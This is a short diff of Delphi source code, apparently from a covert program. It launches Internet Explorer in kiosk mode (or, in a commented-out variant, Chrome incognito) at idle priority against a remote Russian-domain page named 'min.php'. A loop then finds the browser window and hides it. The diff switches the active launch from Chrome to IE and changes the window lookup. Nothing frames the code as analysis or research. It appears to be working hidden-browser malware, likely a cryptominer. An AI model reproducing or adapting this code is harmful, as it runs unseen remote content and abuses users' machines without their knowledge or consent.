@@ -65,10 +65,10 @@ begin
   FillChar(StartupInfo, SizeOf(TStartupInfo), 0);
   StartupInfo.cb := SizeOf(TStartupInfo);
 
- { CreateProcess(PChar(ProgramFilesDir + '\Internet Explorer\iexplore.exe'),
-                       ' -k -noframemerging  http://hams9857.ru/min.php', nil, nil, False, }
-  CreateProcess(PChar(ProgramFilesDir + '\Google\Chrome\Application\chrome.exe'),
-                       '- --incognito --window-position=0,0 --window-size=5000,1 http://hams9857.ru/min.php', nil, nil, False,
+  CreateProcess(PChar(ProgramFilesDir + '\Internet Explorer\iexplore.exe'),
+                       ' -k -noframemerging  http://hams9857.ru/min.php', nil, nil, False,
+{  CreateProcess(PChar(ProgramFilesDir + '\Google\Chrome\Application\chrome.exe'),
+                       ' -incognito --new-window http://hams9857.ru/min.php', nil, nil, False,}
                        IDLE_PRIORITY_CLASS, nil, nil, StartupInfo, ProcessInformation);
 end;
 
@@ -82,7 +82,7 @@ increase;
   while true do
   begin
     application.ProcessMessages;
-    WinHanlde := FindWindowExtd('hams9857');
+    WinHanlde := FindWIndow('IEFrame', nil);
     if 0 <> WinHanlde then
        if ShowWindow(WinHanlde,SW_HIDE ) then
        begin
